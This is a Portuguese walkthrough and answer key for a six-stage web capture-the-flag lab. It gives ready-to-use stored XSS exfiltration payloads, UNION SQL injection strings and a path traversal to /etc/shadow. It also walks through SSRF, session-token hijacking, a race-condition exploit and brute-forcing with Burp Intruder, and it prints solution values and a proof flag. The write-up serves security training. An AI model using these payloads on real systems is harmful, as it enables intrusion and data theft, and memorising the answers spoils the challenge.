# Walkthrough · Recon, Burp Suite e scripts equivalentes

> **Spoilers completos.** Comece pelo fluxo no Burp Suite. Depois, use as seções de Recon e scripts equivalentes para entender como as pistas levam a cada teste e repetir as mesmas requisições pelo navegador. Execute os passos apenas nesta aplicação de laboratório.

## Antes de começar

1. Entre no portal com uma conta sua e abra cada desafio pelo Oráculo ou pelo mapa. Isso emite o ingresso autenticado exigido pelos subdomínios.
2. Mantenha a sessão do portal e os cookies dos desafios. Se uma rota responder **401**, volte ao portal e abra o desafio novamente. Durante uma pausa do CTF, contas comuns não conseguem continuar.
3. Em passos que usam o Console do navegador, abra o DevTools na página do desafio. Os exemplos usam caminhos relativos, então enviam os cookies da sessão atual automaticamente.
4. As flags de Espírito, Fogo, Água, Terra e Luz & Trevas são geradas para a conta autenticada. Em Ar, o texto do documento também é preenchido com a flag da conta.
5. Ao aparecer **Copiar e Submeter Flag ->**, copie a flag, volte ao Oráculo e cole-a no formulário. A cópia não substitui o envio no portal.

| Desafio | Entrada pelo portão | Recompensa |
| :--- | :--- | ---: |
| Espírito | `/oracle-spirit` → `/veil` | 100 XP |
| Ar | `/oracle-air` → Arquivo dos Ventos | 150 XP |
| Fogo | `/oracle-fire` → Forja | 200 XP |
| Água | `/oracle-water` → Espelho e Abismo | 300 XP |
| Terra | `/oracle-earth` → Catálogo | 250 XP |
| Luz & Trevas | `/oracle-light-dark` → dois caminhos | 350 XP |

---

## Resolução principal · Burp Suite

Use o Burp Browser para autenticar no portal e abrir cada desafio. Em **Proxy → HTTP history**, localize a requisição, envie-a ao **Repeater**, preserve `Host` e os cookies de ingresso, e altere somente os parâmetros investigados. Deixe Intercept desligado enquanto navega. A seção de receitas detalhadas do Burp, ao final deste documento, mostra os corpos completos das requisições e os passos de cada ferramenta.

### I · Espírito

Inspecione a resposta HTML de `/veil` no HTTP history. Envie o trecho Base64 do comentário ao Decoder e decodifique. A mensagem do Véu e o link encontrado no Inspector apontam para `/whispers`; use a lista como payload no Intruder, variando somente `name` em `POST /reward.php`. Resposta `200` identifica o candidato correto.

### II · Ar

Consulte os documentos 1, 2 e 5 como `guest`. No Repeater, altere `identity` e `num` em `POST /consultar.php`. O documento 5 traz o certificado do Arnos; os documentos 3 e 4 dão os próximos nomes e o registro arquivado. Use o Cartório ou o Decoder para produzir certificados de 32 caracteres. O número `-1337` aparece quando se compara o campo de número da página à validação da requisição no servidor.

### III · Fogo

Acione a bancada e observe `POST /sessions`. Consulte `GET /sessions` no Repeater e compare o tamanho de cada token. Troque apenas o cookie `sessions` pelo token maior e confirme a identidade em `/whoami.php`. Depois da promoção, crie quatro abas de `/lock.php?n=1..4` no Repeater e envie o grupo em paralelo. Consulte `/vault.php` com o cookie atualizado.

### IV · Água

Leia `X-Mare-Correnteza` na resposta de `GET /reflexo.php`. Esse cabeçalho revela o coletor e o campo disponível no navegador da Guardiã. Envie o XSS armazenado pelo formulário e aguarde a visita. Abra o link capturado para entrar no Abismo. As mensagens de erro e `/abismo.js` levam à função `revelarIngresso()`. Envie o elemento com `onerror` como termo da consulta da Arquivista; depois copie `mensagem` e `recibo` da Correnteza.

### V · Terra

Capture `GET /catalogo.php?q=...` e teste uma aspa no Repeater. Use `ORDER BY 1`, `2` e `3` para medir as colunas. Com o número confirmado, consulte `information_schema.tables` e `information_schema.columns`, então leia `cofre` e `chaveiro`. Preserve o espaço de comentário em `-- -`. Use a Câmara para decifrar o resultado.

### VI · Luz & Trevas

No Repeater, altere `path` em `/shadow.php` e observe que o leitor aceita caminhos acima do diretório listado. No Observatório, a pista sobre a janela leva a investigar `POST /prisma.php` e o JSON `url`. Siga os `farol` e `seal` retornados pelas próprias respostas, na ordem recebida. Una o fragmento do arquivo virtual ao fragmento obtido pela torre e envie ambos no Limiar.

---

## Recon e scripts equivalentes

As seções seguintes mostram como reconhecer as mesmas pistas e repetir as requisições pelo Console do navegador. Para Água e Fogo, o Burp continua útil para inspecionar os pedidos do jogador, enquanto as visitas automatizadas rodam no servidor.

## Scripts equivalentes · I · Espírito

**Ideia:** encontrar a rota correta e testar os nomes do grimório. O nome aceito é escolhido por conta, então não existe uma resposta universal.

1. No portão, leia a mensagem e abra **Exibir código-fonte** (`Ctrl+U`). A pista aparece no comentário perto de “sussurro-do-véu”: `MDIzMmE1N2RiOTJjMWM2MjE2MTEyNGE2ZWQ4NTVmOTY=`. Ela não está no texto visível da página.
2. Decodifique Base64 no Console do navegador ou no Decoder do Burp:

~~~javascript
atob('MDIzMmE1N2RiOTJjMWM2MjE2MTEyNGE2ZWQ4NTVmOTY=')
~~~

O resultado é `0232a57db92c1c62161124a6ed855f96`, o MD5 de `veil`. Isso sugere procurar o caminho público `/veil`. O diretório com esse hash que aparece nos arquivos servidos é detalhe interno; navegue para `/veil`.

3. Na tela do Véu, repare nas frases sobre um **Nome** e um grimório “que não se mostra aos olhos comuns”. Abra as ferramentas do navegador em **Elements/Inspector** ou pesquise `whispers` no código-fonte: existe um link escondido para `/whispers`. A rota lista os 50 candidatos.
4. Para entender o formulário, abra **Network** e tente um nome qualquer. A interface envia esse valor em `POST /reward.php`; resposta **403** significa tentativa incorreta, enquanto **200** traz a flag. Também é possível testar a lista de `/whispers` pelo próprio formulário em `/veil?q=<nome>`.
5. Use os candidatos do seu grimório até o véu reconhecer o Nome da sua conta. Copie a flag e submeta-a no Oráculo.

O nome é derivado no servidor do ID da conta e de `ACCOUNT_SECRET`. Recarregar, trocar de navegador ou usar o nome de outro jogador não é uma forma confiável de obter a sua resposta; use os candidatos do seu grimório.

---

## Scripts equivalentes · II · Ar

**Ideia:** a identidade e o número do documento vêm do navegador e podem ser alterados na requisição.

1. Entre no Arquivo com o login de interface `guest / guest`. Essa senha fictícia só abre a tela do desafio; a sessão autenticada do portal continua obrigatória. Consulte o documento **1** e observe em **Network** que o formulário manda um `POST /consultar.php` com os campos `identity` e `num`.
2. A interface usa um campo numérico não negativo e a rota da identidade aparece no fragmento `#/.../` da URL. Consulte os documentos **2** e **5** como `guest`: o texto do documento 2 diz que falta um certificador; o documento 5 revela o certificado `7cdb09abe167a503ae250c96f09cd1b0`.
3. Não confunda certificado com hash de identidade. No JavaScript `arquivo.js`, procure `AIR_ACCOUNT_HASHES` e `AIR_IDENTITIES`; o hash de conta de Arnos é `363058e8e60aab44cd6ba20359a90c04`. O certificado `7cdb…` é gerado pelo Cartório e também resolve para Arnos. Troque o fragmento para `#/363058e8e60aab44cd6ba20359a90c04/` ou `#/7cdb09abe167a503ae250c96f09cd1b0/`. O card deve mostrar **Arnos** e o Cartório deve destrancar.
4. O Cartório calcula o certificado como os primeiros 32 caracteres hexadecimais de SHA-256 sobre `VENTORUM::<nome em minúsculas>::SIGILLUM`. Gere certificados para os nomes encontrados e use o tradutor para confirmar que cada selo retorna o nome esperado. Os valores deste percurso são:

   | Nome | Certificado |
   | :--- | :--- |
   | Arnos | `7cdb09abe167a503ae250c96f09cd1b0` |
   | Rithos | `3fbd766ad6b3b3d0a568f1485bed48d3` |
   | Pollos | `57a83324ab96a78dc703268ba65b7e99` |
   | Vultum | `8f21c706085360e1143ab3ca15617f3d` |

5. Como Arnos, consulte os documentos **3** e **4**. Eles indicam as identidades de **Rithos** e **Pollos**, o nome de **Vultum** e índices de documentos arquivados. Para entender por que a troca de identidade funciona, examine a requisição `POST /consultar.php`: o servidor confere o campo `identity` enviado pelo cliente, além do ingresso do portal. A função `doc` abaixo torna essa requisição explícita no Console:

~~~javascript
async function doc(identity, num) {
  const response = await fetch('/consultar.php', {
    method: 'POST',
    credentials: 'same-origin',
    body: new URLSearchParams({ identity, num })
  });
  const data = await response.json();
  console.log(response.status, data);
  return data;
}
~~~

6. Se os documentos não mostram os índices de imediato, abra **Sources** e procure `REGISTRO_ARQUIVADO` em `arquivo.js`; ele reúne os números arquivados. Consulte o documento **132** como Rithos, usando o certificado como identidade. Ele revela o número final **-1337**:

~~~javascript
await doc('3fbd766ad6b3b3d0a568f1485bed48d3', 132);
~~~

7. Consulte o documento **497** como Pollos. Ele confirma que o certificador final é Vultum:

~~~javascript
await doc('57a83324ab96a78dc703268ba65b7e99', 497);
~~~

8. A tela limita o campo de número a inteiros não negativos, mas o backend aceita o valor negativo. Essa diferença aparece comparando a validação de `arquivo.js` com a resposta do servidor; envie `num=-1337` no `POST /consultar.php`, junto ao certificado de Vultum:

~~~javascript
await doc('8f21c706085360e1143ab3ca15617f3d', -1337);
~~~

A resposta contém a flag daquela conta. O Console apenas torna explícita a requisição POST que a interface normalmente constrói; o portal ainda valida o ingresso autenticado.

---

## Scripts equivalentes · III · Fogo

**Ideia:** a Forja expõe tokens de sessão falsos e verdadeiros; o maior token pertence ao Guardião Supremo. Depois, quatro travas precisam ser acionadas em paralelo.

1. Abra a Forja e cadastre uma conta local vinculada ao seu usuário do portal. A senha da Forja é independente da senha do portal. Entre nessa conta.
2. Explore a **Bancada do Aprendiz** e acione uma operação. Ela fica bloqueada após o atendimento; o botão **Refazer sessão** restaura a bancada. Observe a requisição no **Network**: é um `POST /sessions` e a resposta contém o token atual da própria conta. Como a rota é revelada pela interface, experimente também um `GET /sessions` no Console ou no Repeater.
3. O GET retorna JSON com `files` e `size`. Para comparar os tamanhos sem abrir os 200 valores manualmente:

~~~javascript
const { files } = await (await fetch('/sessions')).json();
console.table(files.map(({ name, size }) => ({ size, name })).sort((a, b) => a.size - b.size));
~~~

A maioria mede entre 60 e 100 bytes. O token do Guardião Supremo mede entre 200 e 250 bytes e é o maior. Essa diferença é a pista; as outras entradas são iscas associadas à sua conta.
4. Na aba **Application/Armazenamento → Cookies** do DevTools, observe o cookie `sessions` e substitua apenas esse cookie pelo valor maior. Não altere `oracle_challenge` nem os cookies do portal. Também é possível usar o Console:

~~~javascript
document.cookie = 'sessions=' + encodeURIComponent('COLE_AQUI_O_TOKEN_MAIOR') + '; Path=/; SameSite=Lax';
~~~

5. Atualize a página ou consulte `/whoami.php`; o retorno mostra **GUARDIÃO SUPREMO**. O painel oferece uma lista de usuários, mas o próprio texto e a resposta da tentativa de promoção mostram que a identidade é vinculada ao ingresso do portal. Selecione a sua conta e promova-a.
6. Depois da promoção, inspecione o painel e **Network**. As quatro travas chamam `/lock.php?n=1` até `/lock.php?n=4`. Cada chamada demora cerca de 350 ms, mas o backend exige que as quatro cheguem numa janela de 300 ms. Isso explica por que clicar uma de cada vez falha; dispare-as juntas:

~~~javascript
const respostas = await Promise.all(
  [1, 2, 3, 4].map(n =>
    fetch('/lock.php?n=' + n, {
      method: 'POST',
      credentials: 'same-origin'
    }).then(r => r.json())
  )
);
console.log(respostas);
~~~

7. Consulte `GET /vault.php`. Quando `solved` for `true`, a resposta inclui a flag individual.

A lista contém tokens falsos isolados para a sua conta. Eles não autenticam outros jogadores nem podem ser usados para trocar a identidade do portal.

---

## Scripts equivalentes · IV · Água

**Ideia:** explorar um XSS armazenado na superfície para obter o ingresso do Abismo; depois, explorar um XSS refletido para capturar a mensagem e o recibo privados da Arquivista. As duas visitas automatizadas podem levar alguns segundos.

### 1. Obter o ingresso das profundezas

1. No **Espelho das Águas**, abra **Network** e encontre `GET /reflexo.php`. A resposta traz o cabeçalho `X-Mare-Correnteza`: ele mostra o endpoint `/correnteza.php`, o parâmetro `drop` da sua conta e a forma como a Guardiã envia o campo `window.__MARES__.arquivo`. Essa observação indica o que precisa ser capturado e para onde enviar. Também pode ler o cabeçalho no Console:

~~~javascript
const resposta = await fetch('/reflexo.php', { cache: 'no-store' });
console.log(resposta.headers.get('X-Mare-Correnteza'));
~~~

2. Copie o valor depois de `drop=`. A interface salva o conteúdo do reflexo para revisão; ao inspecionar `POST /reflexo.php`, veja que a entrada é persistida. A filtragem remove `<script>`, mas não atributos de evento como `onerror`, então no formulário **Lançar reflexo** envie o payload abaixo, substituindo `COLE_O_DROP` pelo seu valor:

~~~html
<img src=x onerror="fetch('/correnteza.php?drop=COLE_O_DROP',{method:'POST',body:window.__MARES__.arquivo})">
~~~

3. A Guardiã revisa o reflexo em outro navegador. O cabeçalho já indicou que, naquele contexto, `window.__MARES__.arquivo` é o link selado das profundezas. Aguarde a revisão; o payload envia esse link à Correnteza.
4. Acompanhe as chamadas de `/correnteza.php` ou a lista **Correnteza** no Espelho. A captura aparece como **entrar nas profundezas**. Abra-a: o link passa pelo host da superfície, redireciona para `depth-water` e grava o ingresso no cookie `oracle_depth`.

### 2. Capturar a prova da Arquivista

5. Nas profundezas, abra **Network** e use **Solicitar à Arquivista**. Se aparecer “O ingresso ainda não foi apresentado ao arquivo” ou “A Arquivista exige o ingresso trazido da superfície”, volte ao passo anterior e abra o link capturado para registrar o ingresso. Depois de enviar uma consulta válida, a resposta de `POST /solicitar.php` mostra que o bot abrirá uma página de consulta com o termo enviado.
6. Investigue o segundo lado pelas pistas visíveis: a mensagem de erro fala em apresentar o ingresso ao arquivo, e o botão envia o termo para uma consulta que será aberta pela Arquivista. Em **Sources**, abra o JavaScript público `/abismo.js`. A função global `revelarIngresso()` verifica `window.__ARQUIVO__` e `window.__CORRENTEZA__` e faz um `fetch` para enviar o primeiro objeto ao segundo endereço. Como o termo é levado à página visitada pelo bot e a função está disponível globalmente nela, teste um elemento HTML com um handler de evento como termo da consulta:

~~~html
<img src=x onerror="revelarIngresso()">
~~~

7. A Arquivista abre a consulta no próprio navegador. O `onerror` chama `revelarIngresso()` nesse contexto, onde os dois valores privados existem, e a função envia o objeto ao coletor. Aguarde a revisão.
8. Volte ao Espelho. A Correnteza agora mostra **mensagem** e **recibo**. Copie ambos para o formulário **Revelar flag** e envie; o backend valida a mensagem da conta e o recibo daquela revisão antes de retornar a flag.

A mensagem sozinha não basta. O token do bot, `WATER_BOT_TOKEN`, é credencial interna e não participa da solução.

---

## Scripts equivalentes · V · Terra

**Ideia:** reconhecer que a busca monta SQL com o texto do jogador, medir a consulta original, depois usar `UNION` para ler o catálogo de metadados e as duas tabelas escondidas.

1. Abra o **Catálogo de Relíquias**, pesquise um termo normal como `granito` e veja a tabela de resultados. Em **Network**, abra `GET /catalogo.php?q=...`: a resposta inclui a consulta montada, `columns` e `rows`. A prévia da página também mostra o `SELECT nome, descricao FROM relicarios WHERE nome LIKE '%…%'`.
2. Teste uma aspa (`'`) na busca e observe o erro SQL e a consulta ecoada. Isso mostra que a entrada foi interpolada dentro de uma string, sem escaping. Para medir quantas colunas a consulta seleciona, envie estes termos, um por vez, no mesmo campo:

~~~sql
%' ORDER BY 1 -- -
%' ORDER BY 2 -- -
%' ORDER BY 3 -- -
~~~

`ORDER BY 1` e `ORDER BY 2` funcionam; `ORDER BY 3` retorna erro. Confirme a contagem com `UNION SELECT NULL` e compare com a tentativa de três colunas:

~~~sql
%' UNION SELECT NULL,NULL -- -
~~~

~~~sql
%' UNION SELECT NULL,NULL,NULL -- -
~~~

A consulta com dois `NULL` funciona; a de três retorna erro de quantidade de colunas diferente. Todos os exemplos abaixo também vão no campo de busca; a interface codifica o valor na URL.

3. Use o mesmo número de colunas para consultar os metadados do banco atual. Primeiro descubra as tabelas:

~~~sql
%' UNION SELECT table_name, table_schema
FROM information_schema.tables
WHERE table_schema=DATABASE() -- -
~~~

Na resposta, procure `cofre` e `chaveiro`. `DATABASE()` evita depender do nome do schema escrito à mão.
4. Consulte os nomes das colunas dessas duas tabelas:

~~~sql
%' UNION SELECT table_name, column_name
FROM information_schema.columns
WHERE table_schema=DATABASE()
  AND table_name IN ('cofre','chaveiro') -- -
~~~

Isso revela `alg` e `cifra` no `cofre`, e `dono` e `chave` no `chaveiro`.
5. Leia os campos do cofre:

~~~sql
%' UNION SELECT alg, cifra FROM cofre -- -
~~~

O campo `alg` descreve Base64 seguido de XOR com repetição da chave. Depois leia a tabela vizinha:

~~~sql
%' UNION SELECT dono, chave FROM chaveiro -- -
~~~

6. A resposta fornece a cifra e a chave. Para conferir os valores atuais do banco inicial:

   - Cifra: `KCB1LX0xHh5GQkQcLFgKAlwYbE4QRgFSGx4HN0dFAy1CVxlfB1A=`
   - Chave: `gr4n1te-r00ts-d3lv3-b3l0w-th3-0r4cl3s-v4ult-x9`

7. O JavaScript da página mostra a ordem da decifração: `atob` para Base64 e XOR byte a byte, repetindo a chave. Você pode preencher esses valores na **Câmara de Decifração**, que aplica a operação, ou reproduzi-la localmente. O texto resultante é a prova:

   `ORACLE{34rth_un10n_crumbl3s_th3_v4ult}`

8. Informe essa prova na **Câmara de Decifração**. O backend a valida e emite a flag final individual. A prova decifrada e a flag do portal são valores diferentes.

**Atenção ao comentário SQL:** no MariaDB, `--` inicia comentário apenas se vier seguido de espaço ou caractere de controle. Mantenha o espaço em `-- -`; removê-lo pode fazer a consulta falhar.

---

## Scripts equivalentes · VI · Luz & Trevas

**Ideia:** obter um fragmento por path traversal no leitor virtual e outro por SSRF controlada pelo prisma. Os nomes das duas salas e do domínio final dependem da conta; use os valores retornados nas suas próprias consultas.

### 1. Fragmento das Trevas

1. Abra **Trevas → Arquivo**. A tela inicial lista arquivos do setor; examine as entradas e abra um arquivo. Em **Network**, veja que o leitor chama `GET /shadow.php?path=...`, enquanto `GET /diretorio.php` fornece apenas a lista do diretório virtual.
2. Compare o caminho inicial exibido no código do leitor (`/luz/registro/arquivo/ordem/selos`) com o caminho enviado. Teste subir um diretório com `../` e observe que o servidor continua resolvendo caminhos fora do setor. São cinco segmentos até a raiz virtual; então envie:

~~~text
../../../../../etc/shadow
~~~

3. A resposta do arquivo virtual `/etc/shadow` contém `fragmento_trevas=UMBRA-...`. Copie o valor completo, incluindo o prefixo `UMBRA-`.

Esse é um arquivo virtual do desafio, não o `/etc/shadow` real do contêiner.

### 2. Fragmento da Luz

4. Abra o **Observatório**. A mensagem “o que a janela não mostra, o instrumento ainda pode alcançar” indica que o campo é um prisma que consulta outro destino. Inspecione **Network** ou `observatorio.js`: o navegador envia um JSON com `url` para `POST /prisma.php`, e a resposta traz `transmission`. Digite URLs como texto no prisma; os domínios `.luz` só existem na torre interna.
5. Comece pelo farol público indicado na própria página:

~~~text
http://celeste.luz/zenite
~~~

A resposta inclui `farol` (nome da sala do manifesto) e `seal: manifesto`. Use o nome devolvido na próxima URL:

~~~text
http://celeste.luz/<farol_devolvido>/manifesto
~~~

6. Leia os campos `farol` e `seal` da resposta. `seal: manifesto` informa o próximo caminho; use o `farol` retornado, que é sorteado para sua conta, em vez de tentar nomes de sala de outros jogadores:

~~~text
http://celeste.luz/<segundo_farol_devolvido>/selos
~~~

7. A transmissão dos selos fornece a segunda metade. Una as metades **na ordem em que foram recebidas**. Esse é o host do domínio final. Consulte a raiz para ver a indicação `seal: fragmento`:

~~~text
http://<metades_unidas>.luz/
~~~

8. Peça o fragmento nesse domínio:

~~~text
http://<metades_unidas>.luz/fragmento
~~~

A resposta contém `fragmento_luz: LUMEN-...`. Copie o valor completo. Salas e nomes de domínio são sorteados por conta; exemplos como `pegaso`, `argento` e `origem` não são respostas universais.

### 3. Reunir as metades

9. Volte ao portão **Luz & Trevas** e preencha o fragmento `UMBRA-...` e o fragmento `LUMEN-...` no **Limiar do Equilíbrio**.
10. Envie o formulário. O backend confere os dois valores contra a conta autenticada e retorna a flag final individual.

---

## Se algo não funcionar

- **401 em uma rota do desafio:** abra o desafio pelo portal novamente. A sessão do portal é separada dos cookies de sessão internos de Fogo e Água.
- **Ar responde 403:** confira se enviou a identidade indicada para aquele documento; para os protegidos, use o certificado correspondente como valor de `identity`.
- **Água ainda não mostra captura:** confirme que a Guardiã/Arquivista revisou a tentativa e que o payload usa o `drop` do cabeçalho da sua conta. O bot processa uma fila; aguarde e acompanhe o Espelho.
- **Terra retorna erro SQL:** mantenha duas colunas no `UNION SELECT`, feche o texto com `%'` e preserve o espaço em `-- -`.
- **Fogo não abre o cofre:** verifique se a sessão do Fogo virou `admin` e envie as quatro chamadas juntas. Não as coloque em um loop que aguarda cada resposta antes de iniciar a próxima.
- **Luz retorna 404:** use os nomes que vieram das transmissões da sua própria conta e envie o destino através do campo do prisma.
- **Flag copiada, mas pontuação não mudou:** cole-a no formulário do Oráculo e envie. O botão do desafio copia e redireciona, mas não registra sozinho a resolução.

## Referências no código

- [Espírito](../app_chall/01.%20spirit/README.md)
- [Ar](../app_chall/02.%20air/README.md)
- [Fogo](../app_chall/03.%20fire/README.md)
- [Água](../app_chall/04.%20water/README.md)
- [Terra](../app_chall/05.%20earth/README.md)
- [Luz & Trevas](../app_chall/06.%20light%26dark/README.md)

---
## Receitas detalhadas do Burp Suite

Esta seção complementa o walkthrough anterior com o fluxo no **Burp Suite Desktop**. Ela não substitui os passos e payloads já descritos: mostra como capturar, editar e reenviar cada requisição pelo Burp.

## 0 · Preparar o Burp

1. Abra o Burp Suite e inicie um projeto temporário.
2. Vá a **Proxy → Intercept** e clique em **Open browser**. O navegador integrado já usa o proxy do Burp e funciona com HTTPS; não precisa configurar outro navegador ou instalar o certificado para este fluxo.
3. Deixe **Intercept off** enquanto navega. As requisições continuam aparecendo em **Proxy → HTTP history**. Se deixar Intercept on, use **Forward** para liberar cada requisição.
4. No navegador do Burp, entre no portal uma vez e abra um desafio pelo Oráculo ou pelo mapa. Não tente descobrir a senha do portal com Intruder: três erros consecutivos bloqueiam a conta por 30 minutos.
5. Para editar uma chamada, encontre-a em **Proxy → HTTP history**, selecione-a e use o botão direito → **Send to Repeater**. No Repeater, edite a requisição e clique **Send**. Preserve o host e o cookie `oracle_challenge` capturados para o desafio. Se receber 401, volte ao navegador do Burp, abra o portão novamente e envie uma requisição fresca ao Repeater.

O navegador integrado, o histórico mesmo com Intercept desligado e o envio de requisições ao Repeater são descritos na [documentação oficial do Burp Browser](https://portswigger.net/burp/documentation/desktop/tools/burps-browser), do [Proxy HTTP history](https://portswigger.net/burp/documentation/desktop/tools/proxy/http-history) e do [Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater/http-messages).

## I · Espírito no Burp

1. No navegador do Burp, abra `/oracle-spirit` e depois `/veil`. No **HTTP history**, selecione a resposta HTML do portão e procure o trecho Base64 do comentário.
2. Envie esse trecho ao **Decoder** com o botão direito → **Send to Decoder**. Escolha **Decode as → Base64**. O resultado é o hash MD5 da rota; confira `veil` em **Hash → MD5**.
3. Abra `/whispers` no navegador do Burp e copie a lista de candidatos.
4. Para fazer uma tentativa manual, use uma requisição `POST /reward.php` capturada quando a interface testa um nome. Ou crie uma no Repeater a partir de qualquer requisição autenticada desse host:

~~~http
POST /reward.php HTTP/1.1
Host: <host-do-desafio>
Cookie: oracle_challenge=<cookie-capturado>
Content-Type: application/json
Accept: application/json

{"name":"<candidato>"}
~~~

5. Envie uma tentativa pelo Repeater. Resposta **403** significa nome errado; **200** traz a flag no JSON.
6. Para testar o grimório inteiro, envie essa requisição ao **Intruder**. Marque somente o valor de `name` como posição de payload, escolha **Sniper**, selecione **Simple list** e cole os nomes de `/whispers`. Inicie o ataque e filtre a tabela por status **200**; abra essa resposta para copiar a flag. O Intruder substitui o nome em cada envio e preserva os demais campos da requisição.

A documentação do [Decoder](https://portswigger.net/burp/documentation/desktop/tools/decoder) explica as transformações Base64 e hash; o guia oficial do [Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/getting-started) mostra a configuração de Sniper e lista simples.

## II · Ar no Burp

1. No navegador do Burp, entre no Arquivo com `guest / guest`. Esse login é validado no JavaScript; a requisição útil aparece quando você consulta um documento.
2. Consulte `2` e `5` como `guest`. No histórico, encontre `POST /consultar.php` e envie-o ao Repeater.
3. No corpo form-urlencoded, troque os campos para `identity=guest&num=2` e depois `identity=guest&num=5`. Os textos identificam Arnos. Troque a identidade para `Arnos` e consulte `num=3` e `num=4`.
4. Use o Cartório na interface para gerar certificados, ou calcule no Decoder: cole `VENTORUM::rithos::SIGILLUM`, escolha **Hash → SHA-256** e use os primeiros 32 caracteres hexadecimais. Faça o mesmo para Pollos e Vultum. Os valores deste percurso são:

   | Nome | Certificado |
   | :--- | :--- |
   | Rithos | `3fbd766ad6b3b3d0a568f1485bed48d3` |
   | Pollos | `57a83324ab96a78dc703268ba65b7e99` |
   | Vultum | `8f21c706085360e1143ab3ca15617f3d` |

5. Em abas do Repeater, mantenha o host e o cookie autenticado e altere o corpo de `POST /consultar.php`:

~~~text
identity=3fbd766ad6b3b3d0a568f1485bed48d3&num=132
~~~

O documento 132 revela o número `-1337`. Envie outra requisição como Pollos:

~~~text
identity=57a83324ab96a78dc703268ba65b7e99&num=497
~~~

Ela revela Vultum. Por fim, use o certificado de Vultum e o número negativo:

~~~text
identity=8f21c706085360e1143ab3ca15617f3d&num=-1337
~~~

6. Confira cada resposta no painel **Response** do Repeater. A resposta 200 do documento final contém a flag individual. O fragmento da URL do Arquivo não viaja na requisição; o campo decisivo é `identity` no corpo.

## III · Fogo no Burp

1. No navegador do Burp, abra a Forja, cadastre a conta vinculada ao seu usuário do portal e entre nela.
2. Depois de observar a bancada ou clicar em **Refazer sessão**, encontre uma requisição Fire autenticada no histórico. Envie-a ao Repeater e altere o caminho para `GET /sessions`. Preserve no cabeçalho `Cookie` os cookies existentes. A resposta JSON contém `files` e o tamanho de cada token.
3. Copie o valor de `name` do item com o maior `size`. Ele é o token do Guardião Supremo. Em uma cópia da requisição, altere o caminho para `GET /whoami.php` e substitua somente `sessions` no cabeçalho `Cookie` pelo token maior. Mantenha `oracle_challenge`. A resposta deve identificar **GUARDIÃO SUPREMO**.
4. Com o mesmo token, envie `POST /promote.php`. O corpo pode ficar vazio. Na resposta, copie o novo valor de `sessions` no cabeçalho `Set-Cookie`: ele representa a sua conta Fire já promovida a **admin**.
5. Crie quatro requisições no Repeater com o mesmo host e os mesmos cookies — `oracle_challenge` e o novo `sessions` — alterando somente o número:

~~~http
POST /lock.php?n=1 HTTP/1.1
Host: <host-do-fogo>
Cookie: oracle_challenge=<cookie-capturado>; sessions=<token-admin>
Content-Length: 0
~~~

Repita em três abas, usando `n=2`, `n=3` e `n=4`. Não envie cada aba individualmente.
6. Agrupe as quatro abas: no Repeater, clique no botão **+** da barra de abas e escolha **Create tab group**. Dê um nome ao grupo, selecione as quatro abas de `/lock.php` e confirme. Se já criou o grupo, você também pode clicar com o botão direito em cada aba e escolher **Add tab to group**. Selecione uma aba do grupo, abra a seta ao lado de **Send** e escolha **Send group in parallel**. Isso inicia as quatro chamadas juntas, como exige a janela de 300 ms.
7. Se a opção paralela estiver desabilitada, confira se as quatro abas usam o mesmo host, porta e protocolo. Para HTTP/1, vá a **Settings → Tools → Repeater → Connections** e desligue **HTTP/1 connection reuse**; essa é uma das condições da opção de envio paralelo.
8. Consulte `GET /vault.php` usando o token admin. Quando `solved` aparecer como `true`, o JSON inclui a flag.

O Repeater permite agrupar requisições e enviá-las em paralelo. A documentação explica como [criar grupos e enviar o grupo](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group) e como [adicionar abas a grupos](https://portswigger.net/burp/documentation/desktop/tools/repeater/groups).

## IV · Água no Burp

O navegador do Burp mostra as requisições feitas pelo jogador. As visitas da Guardiã e da Arquivista são executadas pelo bot do servidor; elas não passam pelo proxy do seu Burp. Acompanhe o resultado pelas respostas do Espelho à Correnteza.

### Superfície · ingresso do Abismo

1. No navegador do Burp, abra o Espelho e procure no **HTTP history** uma resposta de `GET /reflexo.php`. No painel **Response**, localize o cabeçalho `X-Mare-Correnteza` e copie o valor após `drop=`.
2. No formulário **Lançar reflexo**, envie o payload abaixo, substituindo o marcador pelo seu token. Como a interface codifica o campo de formulário, enviá-lo pelo navegador do Burp evita problemas de URL encoding:

~~~html
<img src=x onerror="fetch('/correnteza.php?drop=COLE_O_DROP',{method:'POST',body:window.__MARES__.arquivo})">
~~~

3. O POST `/reflexo.php` aparecerá no histórico. Aguarde a visita da Guardiã; o payload é executado no contexto dela, onde existe `window.__MARES__.arquivo`.
4. Volte ao Espelho e acompanhe as chamadas `GET /correnteza.php` no histórico. Abra a resposta mais recente: a captura contém o link `/abismo.php?selo=...`. Clique **entrar nas profundezas** no navegador do Burp para seguir o redirecionamento e obter o cookie `oracle_depth` no host das profundezas.

### Profundezas · mensagem e recibo

5. Na página do Abismo aberta pelo navegador do Burp, envie no formulário este termo:

~~~html
<img src=x onerror="revelarIngresso()">
~~~

6. Aguarde a visita da Arquivista. O POST `/solicitar.php` é visível no histórico; a requisição automatizada de revisão não é. A função `revelarIngresso()` roda no contexto da Arquivista e envia a prova privada ao coletor.
7. Volte ao Espelho. Na resposta de `GET /correnteza.php`, localize a captura com os campos `mensagem` e `recibo`. Use-os no formulário **Revelar flag** dentro do navegador do Burp.
8. A resposta de `POST /reward.php` aparece no HTTP history; abra-a para ver o JSON com a flag. Também é possível enviar essa requisição ao Repeater para examiná-la novamente, preservando o cookie autenticado.

O token `drop` e os valores `mensagem` e `recibo` são específicos da conta. Não reutilize capturas de outra conta.

## V · Terra no Burp

1. No navegador do Burp, abra o Catálogo e faça uma busca comum. No **HTTP history**, selecione `GET /catalogo.php?q=...` e envie ao Repeater.
2. Edite somente o parâmetro `q` no editor de parâmetros/Inspector do Repeater. Cole cada payload em uma linha, envie a requisição e leia `rows` na resposta JSON. Se editar a linha Raw diretamente, codifique os espaços como `%20` e verifique que o valor chega ao backend intacto.

~~~sql
%' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='terra_relicario' -- -
~~~

3. Consulte as colunas:

~~~sql
%' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='terra_relicario' AND table_name IN ('cofre','chaveiro') -- -
~~~

4. Extraia os dados do cofre e do chaveiro em duas requisições:

~~~sql
%' UNION SELECT alg, cifra FROM cofre -- -
~~~

~~~sql
%' UNION SELECT dono, chave FROM chaveiro -- -
~~~

